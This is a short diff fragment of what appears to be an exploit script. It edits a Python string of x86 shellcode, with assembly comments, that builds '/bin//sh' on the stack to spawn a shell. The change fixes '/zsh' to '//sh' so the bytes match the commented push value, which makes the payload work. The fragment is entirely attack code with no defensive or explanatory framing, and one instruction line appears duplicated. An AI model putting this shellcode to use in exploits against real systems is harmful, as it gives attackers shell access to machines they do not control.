@@ -9,7 +9,7 @@ shellcode= (
     "\x31\xc0"  
     "\x31\xc0"             # xorl    %eax,%eax
     "\x50"                 # pushl   %eax
-    "\x68""/zsh"           # pushl   $0x68732f2f
+    "\x68""//sh"           # pushl   $0x68732f2f
     "\x68""/bin"           # pushl   $0x6e69622f
     "\x89\xe3"             # movl    %esp,%ebx
     "\x50"                 # pushl   %eax
